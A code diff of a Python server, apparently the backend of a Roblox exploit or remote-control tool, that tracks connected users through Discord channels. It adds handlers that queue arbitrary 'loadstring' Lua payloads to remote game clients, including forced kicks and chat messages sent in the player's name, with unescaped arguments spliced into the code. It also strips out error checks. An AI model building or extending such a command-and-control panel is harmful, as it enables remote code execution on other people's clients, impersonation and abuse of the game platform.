@@ -87,14 +87,11 @@ async def info_report(info: Info):
         }
     ]
 
-    e = requests.post(
+    requests.post(
         f"https://discord.com/api/v10/channels/{channel_id}/messages",
         headers=headers,
         json={"embeds": [embed], "components": components}
     )
-
-    if e.status_code != 200 and e.status_code != 204:
-        log_to_discord(f"Failed to send embed to {channel_id}: {e.text}")
 
     return {"status": "ok"}
 
@@ -111,9 +108,7 @@ async def disconnect(info: Disconnect):
             headers=headers,
             json={"content": "offline (deleting ts)"}
         )
-        d = requests.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers)
-        if d.status_code != 200 and d.status_code != 204:
-            log_to_discord(f"Failed to delete channel {channel_id} for {info.userid}: {d.text}")
+        requests.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers)
         user_channels.pop(info.userid, None)
     cmd_queue.pop(info.userid, None)
     return {"status": "ok"}
@@ -137,9 +132,34 @@ async def send_command(userid: str, request: Request):
     if not is_allowed:
         raise HTTPException(status_code=403)
     cmd = await request.json()
-    if userid not in cmd_queue:
-        cmd_queue[userid] = []
-    cmd_queue[userid].append(cmd)
+    if cmd.get("command") == "resetdb":
+        user_channels.pop(userid, None)
+        cmd_queue.pop(userid, None)
+        log_to_discord(f"{userid} reset database")
+    elif cmd.get("command") == "deletechan":
+        if userid in user_channels:
+            cid = user_channels[userid]
+            requests.delete(f"https://discord.com/api/v10/channels/{cid}", headers=headers)
+            log_to_discord(f"{userid}'s channel deleted manually")
+            user_channels.pop(userid, None)
+    elif cmd.get("command") == "log":
+        log_to_discord(cmd.get("args", ""))
+    elif cmd.get("command") == "kick":
+        if userid not in cmd_queue: cmd_queue[userid] = []
+        cmd_queue[userid].append({
+            "command": "loadstring",
+            "args": f'game:GetService("Players").LocalPlayer:Kick("{cmd.get("args", "Kicked")}")'
+        })
+    elif cmd.get("command") == "say":
+        if userid not in cmd_queue: cmd_queue[userid] = []
+        cmd_queue[userid].append({
+            "command": "loadstring",
+            "args": f'game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("{cmd.get("args", "")}", "All")'
+        })
+    else:
+        if userid not in cmd_queue:
+            cmd_queue[userid] = []
+        cmd_queue[userid].append(cmd)
     return {"status": "command queued"}
 
 if __name__ == "__main__":
